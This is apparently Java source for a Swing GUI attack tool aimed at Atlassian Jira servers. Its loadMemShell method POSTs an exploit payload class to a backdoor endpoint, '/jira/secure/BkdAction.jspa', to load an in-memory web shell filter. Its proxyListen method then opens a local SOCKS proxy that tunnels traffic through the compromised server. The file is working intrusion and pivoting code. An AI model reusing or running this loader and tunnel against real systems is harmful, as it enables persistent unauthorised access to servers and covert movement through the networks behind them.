import cc.anian.client.SocksClientReaderWorker;
import cc.anian.client.SocksServerReaderWorker;
import cc.anian.client.Tunnel;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;
import cn.hutool.http.HttpUtil;

import javax.swing.*;
import java.net.*;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;
import java.util.concurrent.*;

public class Proxxxy {
    public JPanel rootPanel;
    private JButton memShellButton;
    private JTextField targetTextField;
    private JLabel targetLabel;
    private JSpinner listenPort;
    private JComboBox<String> httpTypeSelect;
    private JLabel listenPortLabel;
    private JButton proxySwitch;

    private boolean isMemShellLoad = false;

    private ExecutorService es = Executors.newSingleThreadExecutor();

    public Proxxxy() {
        targetTextField.setText("127.0.0.1:2990");
        listenPort.setValue(2222);
        httpTypeSelect.addItem("http://");
        httpTypeSelect.addItem("https://");
        httpTypeSelect.setToolTipText("http://");
        memShellButton.addActionListener(e -> loadMemShell());
        proxySwitch.addActionListener(e -> proxyListen());
        proxySwitch.setText("开启代理");
        proxySwitch.setEnabled(false);
        listenPort.setEnabled(false);
    }

    private void loadMemShell() {
        try {
            String urlStr = httpTypeSelect.getSelectedItem() + targetTextField.getText() + "/jira/secure/BkdAction.jspa";

            HttpRequest post = HttpUtil.createPost(urlStr)
                    .body("loadFilter=1&filterClz=" + ExpPayload.exp, "application/x-www-form-urlencoded");
            try (HttpResponse result = post.execute()){
                if (result.isOk()){
                    JOptionPane.showMessageDialog(rootPanel, "加载成功");
                    isMemShellLoad = true;
                    proxySwitch.setEnabled(true);
                    listenPort.setEnabled(true);
                } else {
                    JOptionPane.showMessageDialog(rootPanel, "加载失败:" + result.getStatus(), UIManager.getString("OptionPane.messageDialogTitle"), JOptionPane.ERROR_MESSAGE);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            JOptionPane.showMessageDialog(rootPanel, "加载失败:" + e.getMessage(), UIManager.getString("OptionPane.messageDialogTitle"), JOptionPane.ERROR_MESSAGE);
        }
    }


    private volatile boolean proxyRunning = false;

    private void proxyListen() {

        if (!isMemShellLoad){
            JOptionPane.showMessageDialog(rootPanel, "需要先加载内存马", UIManager.getString("OptionPane.messageDialogTitle"), JOptionPane.ERROR_MESSAGE);
            return;
        }
        Integer port = (Integer) listenPort.getValue();
        if (port == null){
            JOptionPane.showMessageDialog(rootPanel, "监听端口号有误", UIManager.getString("OptionPane.messageDialogTitle"), JOptionPane.ERROR_MESSAGE);
            return;
        }
        if (port < 1 || port > 65535){
            JOptionPane.showMessageDialog(rootPanel, "监听端口号有误", UIManager.getString("OptionPane.messageDialogTitle"), JOptionPane.ERROR_MESSAGE);
            return;
        }
        es.execute(() -> {
            String targetUrl = httpTypeSelect.getSelectedItem() + targetTextField.getText();
            Tunnel.init(targetUrl);
            try(ServerSocketChannel serverSocketChannel = ServerSocketChannel.open()) {
                serverSocketChannel.bind(new InetSocketAddress(InetAddress.getByName("127.0.0.1"), port), 50);
                serverSocketChannel.socket().setReuseAddress(true);
                System.out.println("正在监听本地端口:" + port);
                ExecutorService es = new ThreadPoolExecutor(0, 30, 10L, TimeUnit.SECONDS, new SynchronousQueue<>());
                ExecutorService readerEs = Executors.newSingleThreadExecutor();
                readerEs.execute(new SocksServerReaderWorker());

                listenPort.setEnabled(false);
                proxySwitch.setEnabled(false);
                proxyRunning = true;
                JOptionPane.showMessageDialog(rootPanel, "代理已开启");

                while(proxyRunning) {
                    SocketChannel socketChannel = serverSocketChannel.accept();
                    socketChannel.configureBlocking(false);
                    System.out.println("收到客户端连接请求. addr=" + socketChannel.getRemoteAddress());
                    es.execute(new SocksClientReaderWorker(socketChannel));
                }
            } catch (Exception err) {
                err.printStackTrace();
            }

        });
    }




}
